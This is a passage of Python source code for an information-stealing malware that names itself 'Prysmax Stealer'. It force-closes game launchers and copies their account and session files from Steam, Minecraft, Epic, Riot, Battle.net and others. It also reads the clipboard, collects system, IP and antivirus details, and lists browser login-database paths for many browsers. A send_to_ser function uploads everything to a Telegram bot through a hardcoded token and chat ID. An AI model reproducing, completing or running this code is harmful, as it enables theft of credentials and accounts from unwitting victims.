            print(f'Path not found for {category} in {app_name}.')

def recuperar_juegitos():
    games_paths = {
        'Minecraft_Java': {'path': os.path.expandvars('%APPDATA%\\.minecraft'), 'files': ['launcher_accounts.json', 'usercache.json', 'launcher_accounts_microsoft_store.json', 'launcher_profiles.json', 'launcher_settings.json'], 'process': 'javaw.exe'},
        'Lunar_Client': {'path': os.path.expandvars('%APPDATA%\\Lunar Client\\game'), 'files': ['sessions.json', 'settings.json', 'user_data.json', 'accounts.json'], 'process': 'LunarClient.exe'},
        'Epic_Games': {'path': os.path.expandvars('%PROGRAMFILES(X86)%\\Epic Games\\Launcher\\Portal\\Binaries\\Win64'), 'files': ['launcher-sessions.json', 'gameuser.ini', 'EpicGamesLauncher.lock'], 'process': 'EpicGamesLauncher.exe'},
        'Badlion': {'path': os.path.expandvars('%APPDATA%\\Badlion Client'), 'files': ['accounts.json'], 'process': 'Badlion.exe'},
        'Minecraft_Bedrock': {'path': os.path.expandvars('%LOCALAPPDATA%\\Packages\\Microsoft.MinecraftUWP_*\\LocalState'), 'files': [], 'process': 'Minecraft.Windows.exe'},
        'League_of_Legends': {'path': os.path.expandvars('%LOCALAPPDATA%\\Riot Games\\Riot Client\\Data'), 'files': [], 'process': 'LeagueClient.exe'},
        'Valorant': {'path': os.path.expandvars('%LOCALAPPDATA%\\VALORANT\\Saved'), 'files': [], 'process': 'VALORANT-Win64-Shipping.exe'},
        'Steam': {'path': os.path.expandvars('%PROGRAMFILES(X86)%\\Steam'), 'files': ['config\\loginusers.vdf', 'config\\config.vdf'], 'process': 'Steam.exe'},
        'Growtopia': {'path': os.path.expandvars('%LOCALAPPDATA%\\Growtopia'), 'files': ['save.dat'], 'process': 'Growtopia.exe'},
        'Battle.net': {'path': os.path.expandvars('%PROGRAMDATA%\\Battle.net'), 'files': ['Battle.net.config'], 'process': 'Battle.net.exe'},
        'Ubisoft_Connect': {'path': os.path.expandvars('%LOCALAPPDATA%\\Ubisoft Game Launcher'), 'files': ['cache\\cookies', 'settings.yml'], 'process': 'UbisoftConnect.exe'},
        'Rockstar_Social_Club': {'path': os.path.expandvars('%LOCALAPPDATA%\\Rockstar Games\\Social Club'), 'files': ['SocialClubLauncher.log'], 'process': 'SocialClubHelper.exe'},
        'GOG_Galaxy': {'path': os.path.expandvars('%LOCALAPPDATA%\\GOG.com\\Galaxy'), 'files': [], 'process': 'GalaxyClient.exe'},
        'EA_Desktop': {'path': os.path.expandvars('%LOCALAPPDATA%\\Electronic Arts\\EA Desktop'), 'files': [], 'process': 'EADesktop.exe'},
        'Counter-Strike_2': {'path': os.path.expandvars('%PROGRAMFILES(X86)%\\Steam\\steamapps\\common\\Counter-Strike 2'), 'files': [], 'process': 'cs2.exe'}
    }
    
    temp_folder = os.getenv('TEMP')
    backup_folder = os.path.join(temp_folder, 'prysmax_games')
    os.makedirs(backup_folder, exist_ok=True)
    
    extracted_games = []
    for game, details in games_paths.items():
        process_name = details.get('process')
        if process_name:
            try:
                procesos_bytes = subprocess.check_output('chcp 65001 > nul && tasklist', shell=True)
                try:
                    procesos = procesos_bytes.decode('utf-8').splitlines()
                except UnicodeDecodeError:
                    try:
                        procesos = procesos_bytes.decode('cp1252').splitlines()
                    except UnicodeDecodeError:
                        procesos = procesos_bytes.decode('latin1', errors='replace').splitlines()
                proceso_encontrado = any(process_name.lower() in proceso.lower() for proceso in procesos)
                if proceso_encontrado:
                    print(f'Cerrando el proceso: {process_name}')
                    subprocess.run(f'taskkill /F /IM {process_name}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=134217728, start_new_session=True)
                    print(f'Proceso {process_name} cerrado.')
                else:
                    print(f'El proceso {process_name} no se encuentra en ejecución.')
            except subprocess.CalledProcessError as e:
                print(f'Error al obtener la lista de procesos: {e}')
                continue
        
        game_folder = os.path.join(backup_folder, game)
        os.makedirs(game_folder, exist_ok=True)
        game_path = details['path']
        files = details['files']
        
        if os.path.exists(game_path):
            if files:
                for file in files:
                    file_path = os.path.join(game_path, file)
                    if os.path.exists(file_path):
                        shutil.copy(file_path, game_folder)
            else:
                for item in os.listdir(game_path):
                    item_path = os.path.join(game_path, item)
                    if os.path.isdir(item_path):
                        shutil.copytree(item_path, os.path.join(game_folder, item))
                    else:
                        shutil.copy(item_path, os.path.join(game_folder, item))
        
        game_name = game.replace('_', ' ')
        extracted_games.append(game_name)
    
    zip_file = os.path.join(temp_folder, 'prysmax_games.zip')
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(backup_folder):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, backup_folder))
    
    print("Backup completado y comprimido en:", zip_file)
    print("Juegos extraídos:", extracted_games)

recuperar_juegitos()


def get_windows_version():
    try:
        result_bytes = subprocess.check_output('chcp 65001 > nul && systeminfo', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        for line in result.splitlines():
            if 'OS' in line:
                return line.strip()
    except subprocess.CalledProcessError as e:
        return f'Error: {e.output}'
    return 'Windows version not found'

def get_ip_address():
    try:
        result_bytes = subprocess.check_output('chcp 65001 > nul && ipconfig', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        for line in result.splitlines():
            if 'IPv4' in line:
                return line.split(':')[1].strip()
    except subprocess.CalledProcessError as e:
        return f'Error: {e.output}'
    return 'IP address not found'

def get_mac_address():
    mac_address = None
    try:
        result_bytes = subprocess.check_output('chcp 65001 > nul && ipconfig /all', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        for line in result.splitlines():
            if 'Physical' in line:
                mac_address = line.split(':')[1].strip()
                if mac_address:
                    return mac_address
    except subprocess.CalledProcessError:
        pass
    try:
        result_bytes = subprocess.check_output('chcp 65001 > nul && getmac', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        if result:
            mac_address = result.splitlines()[0].strip()
            if mac_address:
                return mac_address
    except subprocess.CalledProcessError:
        pass
    try:
        result_bytes = subprocess.check_output('chcp 65001 > nul && wmic nic get MACAddress', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        for line in result.splitlines():
            if line.strip() and 'MACAddress' not in line:
                mac_address = line.strip()
                if mac_address:
                    return mac_address
    except subprocess.CalledProcessError:
        pass
    return mac_address if mac_address else 'MAC Address not found'
try:
    capture_screen()
except Exception as e:
    reportar_error(e, 'Error capturando pantalla')
    print(e)

def get_ram():
    try:
        result_bytes = subprocess.check_output('chcp 65001 > nul && systeminfo', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        for line in result.splitlines():
            if 'Total Physical Memory' in line:
                return line.split(':')[1].strip()
        result_bytes = subprocess.check_output('chcp 65001 > nul && wmic memorychip get capacity', shell=True, stderr=subprocess.STDOUT)
        try:
            result = result_bytes.decode('utf-8')
        except UnicodeDecodeError:
            try:
                result = result_bytes.decode('cp1252')
            except UnicodeDecodeError:
                result = result_bytes.decode('latin1', errors='replace')
        ram_lines = result.splitlines()
        if len(ram_lines) > 1:
            total_ram = sum((int(r) for r in ram_lines[1:] if r.strip().isdigit()))
            return f'{total_ram / 1024 ** 2:.2f} MB'
    except subprocess.CalledProcessError as e:
        return f'Error: {e.output}'
    return 'RAM information not found'

def get_tasklist():
    try:
        result = subprocess.check_output('tasklist', shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result
    except subprocess.CalledProcessError as e:
        return f'Error: {e.output}'

def get_network_info():
    try:
        result = subprocess.check_output('ipconfig /all', shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result
    except subprocess.CalledProcessError as e:
        return f'Error: {e.output}'

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json()['ip']
    except requests.exceptions.RequestException as e:
        return f'Error: {e}'

def get_ip_info(ip):
    url = f'https://ipwhois.app/json/{ip}'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            print(f'Datos recibidos de {url}: {data}')
            ip_info = {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'company_name': data.get('org', 'Unknown'),
                'country_code': data.get('country_code', 'Unknown')
            }
            return ip_info
        else:
            print(f'Error: Status code {response.status_code} al consultar la API.')
            return {'error': f'Status code {response.status_code}.'}
    except requests.exceptions.RequestException as e:
        print(f'Error al realizar la solicitud a {url}: {e}')
        return {'error': 'Error al realizar la solicitud a la API.'}

def obtn_teclao():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    CF_UNICODETEXT = 13
    MAX_RETRIES = 2
    RETRY_DELAY = 0.1
    user32.OpenClipboard.argtypes = [ctypes.c_void_p]
    user32.OpenClipboard.restype = ctypes.c_bool
    user32.IsClipboardFormatAvailable.argtypes = [ctypes.c_uint]
    user32.IsClipboardFormatAvailable.restype = ctypes.c_bool
    user32.GetClipboardData.argtypes = [ctypes.c_uint]
    user32.GetClipboardData.restype = ctypes.c_void_p
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalUnlock.restype = ctypes.c_bool

    def try_obtn_teclao_text():
        text_data = None
        if not user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
            return 'Clipboard does not contain Unicode text'
        if not user32.OpenClipboard(None):
            return 'Failed to open clipboard'
        try:
            handle = user32.GetClipboardData(CF_UNICODETEXT)
            if not handle:
                return 'Failed to get clipboard data'
            pointer = kernel32.GlobalLock(handle)
            if not pointer:
                return 'Failed to lock clipboard memory'
            try:
                text_data = ctypes.wstring_at(pointer)
            finally:
                kernel32.GlobalUnlock(handle)
        finally:
            user32.CloseClipboard()
        return text_data or 'No text in clipboard'
    for attempt in range(MAX_RETRIES):
        result = try_obtn_teclao_text()
        if 'Failed' not in result:
            return result
        time.sleep(RETRY_DELAY)
    return 'Could not retrieve clipboard content after multiple attempts'

def save_data(username):
    # Create a temporary directory based on current time
    temp_dir = os.path.join(os.getenv('TEMP'), f'prysmax_{current_time}')
    os.makedirs(temp_dir, exist_ok=True)

    # Save clipboard content
    clipboard_text = obtn_teclao()
    with open(os.path.join(temp_dir, 'clipboard.txt'), 'w', encoding='utf-8', errors='replace') as f:
        f.write(clipboard_text)

    # Save system information
    system_info = f"""Stealer log by Prysmax Stealer
t.me/prysmaxsoftware
- prysmax.xyz -

PC Name: {pc_name}
Desktop Name: {desktop_name}
Windows Version: {os_version}
Files Stolen: {file_count}
IP Address: {get_ip_address()}
Games Extracted: {extracted_games}
MAC Address: {get_mac_address()}
GPU: {gpu}
RAM: {get_ram()}
Public IP: {get_public_ip()}
Antivirus: {antivirus_names}"""
    with open(os.path.join(temp_dir, 'system.txt'), 'w', encoding='utf-8') as f:
        f.write(system_info)

    # Save task list output
    with open(os.path.join(temp_dir, 'tasklist.txt'), 'w', encoding='utf-8') as f:
        f.write(get_tasklist())

    # Save IP detailed information
    ip_info = json.dumps(get_ip_info(get_public_ip()))
    with open(os.path.join(temp_dir, 'ip_info.txt'), 'w', encoding='utf-8') as f:
        f.write(ip_info)

    # Send data to server
    send_to_ser(temp_dir, username)

    print(f'Carpeta temporal eliminada: {temp_dir}')

def send_to_ser(temp_dir, username):
    TELEGRAM_BOT_TOKEN = "7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE"
    TELEGRAM_CHAT_ID = "1665274281"
    for file_name in os.listdir(temp_dir):
        file_path = os.path.join(temp_dir, file_name)
        if os.path.isfile(file_path):
            print(f'Enviando archivo: {file_name}')
            # Build a caption with additional information
            caption = (
                f"Usuario: {username.lower()}\n"
                f"PC Name: {pc_name}\n"
                f"Desktop Name: {desktop_name}\n"
                f"Windows Version: {os_version}\n"
                f"Games Extracted: {json.dumps(extracted_games)}\n"
                f"Files Stolen: {file_count}\n"
                f"IP Address: {get_ip_address()}\n"
                f"MAC Address: {get_mac_address()}\n"
                f"GPU Info: {gpu}\n"
                f"RAM: {get_ram()}\n"
                f"Public IP: {get_public_ip()}\n"
                f"Current Time: {current_time}\n"
                f"Cookies Count: {cookies_count}\n"
                f"Telegram Exists: {verificar_telegram()}\n"
                f"Antivirus Names: {antivirus_names}"
            )
            max_attempts = 2
            attempt = 0
            while attempt < max_attempts:
                try:
                    with open(file_path, 'rb') as f:
                        files = {'document': f}
                        data = {
                            'chat_id': TELEGRAM_CHAT_ID,
                            'caption': caption
                        }
                        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
                        response = requests.post(url, data=data, files=files)
                        if response.status_code == 200:
                            print(f'Archivo {file_name} enviado exitosamente al bot de Telegram.')
                            break
                        else:
                            print(f'Error al enviar {file_name}: {response.status_code} - {response.text}')
                            attempt += 1
                            if attempt < max_attempts:
                                print(f'Reintentando en 3 segundos... Intento {attempt}')
                                time.sleep(3)
                except Exception as e:
                    reportar_error(e, 'Error enviando los archivos al bot de Telegram')
                    print(f'Error al enviar el archivo: {str(e)}')
                    attempt += 1
                    if attempt < max_attempts:
                        print(f'Reintentando en 3 segundos... Intento {attempt}')
                        time.sleep(3)

def thread_task(func, *args):
    try:
        func(*args)
    except Exception as e:
        reportar_error(e, 'thread_task')
        pass

browsers = {
    'Chrome': {
        'local_state': make_path('AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
    },
    'Edge': {
        'local_state': make_path('AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
    },
    'Brave': {
        'local_state': make_path('AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')
    },
    'Opera': {
        'local_state': make_path('AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Local State'),
        'login_data': make_path('AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
        'web_data': make_path('AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Web Data')
    },
    'Yandex': {
        'local_state': make_path('AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Web Data')
    },
    'Vivaldi': {
        'local_state': make_path('AppData', 'Local', 'Vivaldi', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Vivaldi', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Vivaldi', 'User Data', 'Default', 'Web Data')
    },
    'Opera GX': {
        'local_state': make_path('AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'),
        'login_data': make_path('AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data'),
        'web_data': make_path('AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Web Data')
    },
    'Chromium': {
        'local_state': make_path('AppData', 'Local', 'Chromium', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Chromium', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Chromium', 'User Data', 'Default', 'Web Data')
    },
    'Torch': {
        'local_state': make_path('AppData', 'Local', 'Torch', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Torch', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Torch', 'User Data', 'Default', 'Web Data')
    },
    'CentBrowser': {
        'local_state': make_path('AppData', 'Local', 'CentBrowser', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'CentBrowser', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'CentBrowser', 'User Data', 'Default', 'Web Data')
    },
    'CocCoc': {
        'local_state': make_path('AppData', 'Local', 'CocCoc', 'Browser', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'CocCoc', 'Browser', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'CocCoc', 'Browser', 'User Data', 'Default', 'Web Data')
    },
    'Slimjet': {
        'local_state': make_path('AppData', 'Local', 'Slimjet', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Slimjet', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Slimjet', 'User Data', 'Default', 'Web Data')
    },
    'Iridium': {
        'local_state': make_path('AppData', 'Local', 'Iridium', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Iridium', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Iridium', 'User Data', 'Default', 'Web Data')
    },
    'Comodo Dragon': {
        'local_state': make_path('AppData', 'Local', 'Comodo', 'Dragon', 'User Data', 'Local State'),
        'login_data': make_path('AppData', 'Local', 'Comodo', 'Dragon', 'User Data', 'Default', 'Login Data'),
        'web_data': make_path('AppData', 'Local', 'Comodo', 'Dragon', 'User Data', 'Default', 'Web Data')
    },
    'Pale Moon': {
        'local_state': '',
        'login_data': make_path('AppData', 'Roaming', 'Moonchild Productions', 'Pale Moon', 'Profiles'),
        'web_data': make_path('AppData', 'Roaming', 'Moonchild Productions', 'Pale Moon', 'Profiles')
    }
}

if __name__ == '__main__':
    try:
        username = "default"
        if 'lavacuna_palnavegador' not in globals():
            def lavacuna_palnavegador():
                pass
        if 'devolver_a_Telegram' not in globals():
            def devolver_a_Telegram():
                pass
        if 'reportar_error' not in globals():
            def reportar_error(e, msg):
                print(f"{msg}: {e}")
                
        try:
            os.remove(os.path.join(os.path.expanduser('~'), 'xx.flag'))
        except:
            pass
        thread1 = threading.Thread(target=thread_task, args=(lavacuna_palnavegador,))
        thread2 = threading.Thread(target=thread_task, args=(lambda: None,))
        thread4 = threading.Thread(target=thread_task, args=(save_data, username))
        thread1.start()
        thread2.start()
        thread4.start()
        thread1.join()
        thread2.join()
        thread4.join()
        try:
            devolver_a_Telegram()
        except Exception as e:
            reportar_error(e, 'Ejecutando funcion devolver_a_Telegram')
            print(e)
        try:
            print('xddd')
        except Exception as t:
            print(f'Error en start {t}')
            reportar_error(t, 'Error en addons de prysmax')
    except Exception as e:
        print(f'error en iniciar todo xd {e}')
        reportar_error(e, 'Error en la funcion if main iniciar todo')